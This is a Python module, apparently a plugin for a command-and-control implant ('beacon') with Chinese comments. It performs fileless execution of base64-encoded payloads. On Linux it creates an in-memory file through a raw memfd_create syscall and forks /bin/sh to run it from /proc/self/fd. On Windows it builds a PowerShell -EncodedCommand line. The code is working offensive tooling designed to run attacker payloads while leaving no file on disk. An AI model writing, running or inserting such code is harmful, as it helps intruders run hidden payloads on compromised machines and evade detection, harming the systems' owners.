"""
@module: memfd
@desc: 无文件执行（Linux: memfd_create 内存执行；Windows: powershell -enc）
payload 为 base64 编码的 shell 脚本/命令。
"""
import base64
import os

MODULE = {
    "desc": "无文件执行（Linux memfd_create 内存跑；Windows powershell）",
    "params": [("payload_b64", "必填；base64 编码的命令/脚本"),
               ("interp", '默认 "sh"（Linux）')],
}


def run(payload_b64, interp="sh"):
    try:
        data = base64.b64decode(payload_b64)
    except Exception as e:
        return f"(error: 非法 base64: {e})"
    if os.name == "nt":
        enc = base64.b64encode(data).decode()
        return ("(windows: powershell -NoProfile -EncodedCommand "
                f"{enc} 即可内存加载，无文件落地)")
    try:
        import ctypes
        import platform
        import subprocess
        libc = ctypes.CDLL(None)
        # memfd_create: x86_64=319, aarch64=385
        syscall_n = 319 if platform.machine() in ("x86_64", "amd64") else 385
        fd = libc.syscall(syscall_n, b"x", 0)
        if fd < 0:
            return "(memfd_create failed)"
        os.write(fd, b"#!/bin/sh\n" + data)
        os.lseek(fd, 0, 0)
        # fork 子进程执行 memfd（/proc/self/fd/N），beacon 进程不受影响
        pid = os.fork()
        if pid == 0:
            os.execv("/bin/sh", ["/bin/sh", f"/proc/self/fd/{fd}"])
        os.close(fd)
        return f"(memfd 无文件执行: pid={pid}，无磁盘文件)"
    except Exception as e:
        return f"(error: {e})"
